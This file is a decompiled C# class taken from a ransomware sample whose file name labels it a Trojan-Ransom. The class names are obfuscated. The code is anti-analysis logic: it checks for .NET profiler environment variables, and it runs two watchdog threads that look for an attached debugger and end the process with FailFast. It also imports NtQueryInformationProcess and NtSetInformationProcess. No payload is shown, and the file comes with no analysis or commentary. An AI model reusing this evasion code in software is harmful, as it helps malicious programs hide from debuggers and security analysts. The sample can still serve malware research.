// Decompiled with JetBrains decompiler
// Type: ⯌癦며Ⳟ醎轥桹츮
// Assembly: uzjSR5XnMreRD, Version=2.6.1.2, Culture=neutral, PublicKeyToken=null
// MVID: 8F87B908-3642-4B60-8D81-E7A9714E6A58
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-f62f12aa2fcfd0604e2da1c0a0341d35694eb312105b442d408e4e376a93df3b.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

internal static class \u2BCC癦며Ⳟ醎轥桹츮
{
  [DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess", CallingConvention = CallingConvention.StdCall, SetLastError = true, PreserveSig = false)]
  private static extern int \u23B0鏝籡䴵쿭䉜鍯ꞥ(
    IntPtr ProcessHandle,
    int ProcessInformationClass,
    byte[] ProcessInformation,
    uint ProcessInformationLength,
    out int ReturnLength);

  [DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess", CallingConvention = CallingConvention.StdCall, SetLastError = true, PreserveSig = false)]
  private static extern uint 쥒\u2AC6㵄ꋐ迈Һ脺ࠨ(
    IntPtr ProcessHandle,
    int ProcessInformationClass,
    byte[] ProcessInformation,
    uint ProcessInformationLength);

  [DllImport("kernel32.dll", EntryPoint = "CloseHandle", PreserveSig = false)]
  private static extern bool 转ⱹ媻礗矐ᚇ\u085D릏(IntPtr hObject);

  public static void 㬕筲\uFFFD瀪抚\uFFFD\uFFFD疰()
  {
    switch (Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING"))
    {
      case null:
        switch (Environment.GetEnvironmentVariable("COR_PROFILER"))
        {
          case null:
            break;
          default:
            goto label_1;
        }
        break;
      default:
label_1:
        Environment.FailFast("Profiler detected");
        break;
    }
    Thread parameter1 = new Thread(new ParameterizedThreadStart(\u2BCC癦며Ⳟ醎轥桹츮.硡了둍\uE08E\uE8FD巴卉\uE77C));
    Thread parameter2 = new Thread(new ParameterizedThreadStart(\u2BCC癦며Ⳟ醎轥桹츮.硡了둍\uE08E\uE8FD巴卉\uE77C));
    parameter1.IsBackground = true;
    parameter2.IsBackground = true;
    parameter1.Start((object) parameter2);
    Thread.Sleep(500);
    parameter2.Start((object) parameter1);
  }

  private static void 硡了둍\uE08E\uE8FD巴卉\uE77C(object thread)
  {
    Thread.Sleep(1000);
    Thread thread1 = (Thread) thread;
    while (true)
    {
      if (Debugger.IsAttached || Debugger.IsLogging())
        goto label_3;
label_1:
      if (!thread1.IsAlive)
        goto label_5;
label_2:
      Thread.Sleep(1000);
      continue;
label_5:
      Environment.FailFast("Loop broken");
      goto label_2;
label_3:
      Environment.FailFast("Debugger detected (Managed)");
      goto label_1;
    }
  }
}
